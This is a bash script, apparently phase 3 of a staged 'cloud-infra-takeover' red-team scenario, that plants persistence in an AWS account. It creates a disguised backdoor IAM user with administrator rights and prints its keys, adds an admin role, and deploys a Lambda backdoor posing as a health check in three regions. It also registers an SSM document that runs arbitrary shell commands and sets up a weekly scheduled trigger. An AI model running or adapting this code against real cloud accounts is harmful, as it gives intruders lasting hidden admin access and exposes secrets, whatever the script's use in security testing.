#!/bin/bash

# File: test_scenarios/cloud-infra-takeover/03_persistence.sh  
# Phase 3: Establish Persistence Mechanisms

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables for persistence mechanisms
BACKDOOR_USER="system-backup-automation"
BACKDOOR_ROLE="BackupServiceRole"
LAMBDA_FUNCTION="infrastructure-health-check"
SSM_DOCUMENT="CustomMaintenanceDocument"
REGIONS=("us-west-2" "us-east-1" "us-east-2")

echo -e "${YELLOW}[*] Starting Phase 3: Establishing Persistence Mechanisms${NC}"
echo -e "${YELLOW}[*] Creating multiple backdoor access methods across regions${NC}"

# Use escalated profile from previous phase
PROFILE="escalated"

# Verify we have escalated privileges
echo -e "${GREEN}[+] Verifying escalated privileges...${NC}"
aws sts get-caller-identity --profile $PROFILE 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] No escalated profile found. Run 02_privilege_escalation.sh first${NC}"
    exit 1
fi

# 1. Create backdoor IAM user with programmatic access
echo -e "${GREEN}[+] Creating backdoor IAM user for persistent access...${NC}"
aws iam create-user \
    --user-name $BACKDOOR_USER \
    --tags Key=Purpose,Value=automation Key=Team,Value=infrastructure Key=Environment,Value=production \
    --profile $PROFILE

# Attach administrative policies to backdoor user  
echo -e "${RED}[!] Granting administrative access to backdoor user...${NC}"
aws iam attach-user-policy \
    --user-name $BACKDOOR_USER \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    --profile $PROFILE

# Create access keys for backdoor user
echo -e "${GREEN}[+] Creating access keys for backdoor user...${NC}"
BACKDOOR_KEYS=$(aws iam create-access-key --user-name $BACKDOOR_USER --profile $PROFILE)
BACKDOOR_ACCESS_KEY=$(echo $BACKDOOR_KEYS | jq -r '.AccessKey.AccessKeyId')
BACKDOOR_SECRET_KEY=$(echo $BACKDOOR_KEYS | jq -r '.AccessKey.SecretAccessKey')

echo -e "${RED}[!] Backdoor user credentials created:${NC}"
echo -e "Access Key: $BACKDOOR_ACCESS_KEY"
echo -e "Secret Key: $BACKDOOR_SECRET_KEY"

# Save backdoor credentials
echo "$BACKDOOR_ACCESS_KEY" > /tmp/backdoor-access-key.txt
echo "$BACKDOOR_SECRET_KEY" > /tmp/backdoor-secret-key.txt

# 2. Create backdoor service role with cross-region access
echo -e "${GREEN}[+] Creating backdoor service role...${NC}"
cat > /tmp/backdoor-role-trust.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Service": ["lambda.amazonaws.com", "ssm.amazonaws.com", "ec2.amazonaws.com"]
            },
            "Action": "sts:AssumeRole"
        },
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::$(aws sts get-caller-identity --profile $PROFILE --query Account --output text):root"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
EOF

aws iam create-role \
    --role-name $BACKDOOR_ROLE \
    --assume-role-policy-document file:///tmp/backdoor-role-trust.json \
    --description "Service role for infrastructure backup and maintenance operations" \
    --profile $PROFILE

# Attach policies to backdoor role
aws iam attach-role-policy \
    --role-name $BACKDOOR_ROLE \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    --profile $PROFILE

# 3. Deploy persistence Lambda function across regions  
echo -e "${GREEN}[+] Deploying persistence Lambda functions across regions...${NC}"

# Create Lambda deployment package
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3
import os
from datetime import datetime

def lambda_handler(event, context):
    """
    Infrastructure health check and maintenance function
    Provides backdoor access via Lambda execution
    """
    
    # Log execution for tracking
    print(f"Health check executed at {datetime.utcnow()}")
    
    # If specific parameters provided, execute commands
    if 'command' in event:
        try:
            if event['command'] == 'enumerate':
                # Enumerate AWS resources
                sts = boto3.client('sts')
                identity = sts.get_caller_identity()
                
                ec2 = boto3.client('ec2')
                instances = ec2.describe_instances()
                
                s3 = boto3.client('s3')
                buckets = s3.list_buckets()
                
                return {
                    'statusCode': 200,
                    'body': json.dumps({
                        'identity': identity,
                        'instances': len(instances['Reservations']),
                        'buckets': len(buckets['Buckets']),
                        'timestamp': datetime.utcnow().isoformat()
                    })
                }
                
            elif event['command'] == 'access_secrets':
                # Access secrets manager
                secrets = boto3.client('secretsmanager')
                secret_list = secrets.list_secrets()
                
                return {
                    'statusCode': 200,
                    'body': json.dumps({
                        'secrets_count': len(secret_list.get('SecretList', [])),
                        'timestamp': datetime.utcnow().isoformat()
                    })
                }
                
        except Exception as e:
            return {
                'statusCode': 500,
                'body': json.dumps({'error': str(e)})
            }
    
    # Default health check response
    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Infrastructure health check completed',
            'timestamp': datetime.utcnow().isoformat()
        })
    }
EOF

# Package Lambda function
cd /tmp
zip lambda-deployment.zip lambda_function.py

# Deploy across multiple regions
for region in "${REGIONS[@]}"; do
    echo -e "${GREEN}[+] Deploying Lambda function in region: $region${NC}"
    
    aws lambda create-function \
        --function-name $LAMBDA_FUNCTION \
        --runtime python3.9 \
        --role arn:aws:iam::$(aws sts get-caller-identity --profile $PROFILE --query Account --output text):role/$BACKDOOR_ROLE \
        --handler lambda_function.lambda_handler \
        --zip-file fileb://lambda-deployment.zip \
        --description "Infrastructure health monitoring and maintenance" \
        --timeout 60 \
        --region $region \
        --profile $PROFILE
    
    # Grant invoke permissions
    aws lambda add-permission \
        --function-name $LAMBDA_FUNCTION \
        --statement-id "allow-manual-invoke" \
        --action lambda:InvokeFunction \
        --principal "$(aws sts get-caller-identity --profile $PROFILE --query Arn --output text)" \
        --region $region \
        --profile $PROFILE 2>/dev/null
        
    echo -e "${RED}[!] Persistence Lambda deployed in $region${NC}"
done

# 4. Create SSM document for remote command execution
echo -e "${GREEN}[+] Creating SSM document for remote execution...${NC}"
cat > /tmp/ssm-document.json << 'EOF'
{
    "schemaVersion": "2.2",
    "description": "Custom maintenance document for infrastructure operations",
    "parameters": {
        "commands": {
            "type": "StringList",
            "description": "Commands to execute",
            "default": ["echo 'Maintenance check completed'"]
        }
    },
    "mainSteps": [
        {
            "action": "aws:runShellScript",
            "name": "executeCommands",
            "inputs": {
                "runCommand": [
                    "#!/bin/bash",
                    "echo 'Starting maintenance operations...'",
                    "whoami",
                    "pwd",
                    "{{#commands}}",
                    "{{.}}",
                    "{{/commands}}",
                    "echo 'Maintenance operations completed'"
                ]
            }
        }
    ]
}
EOF

aws ssm create-document \
    --name $SSM_DOCUMENT \
    --document-type Command \
    --content file:///tmp/ssm-document.json \
    --document-format JSON \
    --profile $PROFILE

# 5. Create scheduled Lambda for periodic access  
echo -e "${GREEN}[+] Setting up periodic execution schedule...${NC}"
aws events put-rule \
    --name "infrastructure-maintenance-schedule" \
    --schedule-expression "rate(7 days)" \
    --description "Weekly infrastructure health check" \
    --profile $PROFILE

# Add Lambda target to scheduled rule
aws events put-targets \
    --rule "infrastructure-maintenance-schedule" \
    --targets "Id"="1","Arn"="arn:aws:lambda:us-west-2:$(aws sts get-caller-identity --profile $PROFILE --query Account --output text):function:$LAMBDA_FUNCTION" \
    --profile $PROFILE

# Grant CloudWatch Events permission to invoke Lambda
aws lambda add-permission \
    --function-name $LAMBDA_FUNCTION \
    --statement-id "allow-cloudwatch-invoke" \
    --action lambda:InvokeFunction \
    --principal events.amazonaws.com \
    --source-arn "arn:aws:events:us-west-2:$(aws sts get-caller-identity --profile $PROFILE --query Account --output text):rule/infrastructure-maintenance-schedule" \
    --region us-west-2 \
    --profile $PROFILE 2>/dev/null

# 6. Test persistence mechanisms
echo -e "\n${YELLOW}[*] Testing persistence mechanisms...${NC}"

# Test Lambda backdoor
echo -e "${GREEN}[+] Testing Lambda persistence backdoor...${NC}"
aws lambda invoke \
    --function-name $LAMBDA_FUNCTION \
    --payload '{"command": "enumerate"}' \
    --region us-west-2 \
    --profile $PROFILE \
    /tmp/lambda-response.json

if [ $? -eq 0 ]; then
    echo -e "${RED}[!] Lambda backdoor functional${NC}"
    cat /tmp/lambda-response.json
fi

# Test backdoor user access
echo -e "${GREEN}[+] Testing backdoor user access...${NC}"
aws configure set aws_access_key_id $BACKDOOR_ACCESS_KEY --profile backdoor
aws configure set aws_secret_access_key $BACKDOOR_SECRET_KEY --profile backdoor  
aws configure set region us-west-2 --profile backdoor

aws sts get-caller-identity --profile backdoor 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "${RED}[!] Backdoor user access confirmed${NC}"
fi

echo -e "\n${GREEN}[+] Phase 3 Complete: Persistence mechanisms established${NC}"
echo -e "${RED}[!] PERSISTENCE SUMMARY:${NC}"
echo -e "  - Backdoor user: $BACKDOOR_USER (with admin access)"
echo -e "  - Backdoor role: $BACKDOOR_ROLE (multi-service trust)"  
echo -e "  - Lambda functions: $LAMBDA_FUNCTION (deployed in ${#REGIONS[@]} regions)"
echo -e "  - SSM document: $SSM_DOCUMENT (remote execution capability)"
echo -e "  - Scheduled execution: Weekly maintenance trigger"
echo -e "${YELLOW}[*] Next: Run 04_impact_simulation.sh to demonstrate attack capabilities${NC}"

# Save persistence artifacts for cleanup
echo "$BACKDOOR_USER" > /tmp/cloud-infra-takeover-backdoor-user.txt
echo "$BACKDOOR_ROLE" >> /tmp/cloud-infra-takeover-backdoor-user.txt
echo "$LAMBDA_FUNCTION" >> /tmp/cloud-infra-takeover-backdoor-user.txt
echo "$SSM_DOCUMENT" >> /tmp/cloud-infra-takeover-backdoor-user.txt

# Clean up temp files
rm -f /tmp/backdoor-role-trust.json /tmp/lambda_function.py /tmp/lambda-deployment.zip /tmp/ssm-document.json /tmp/lambda-response.json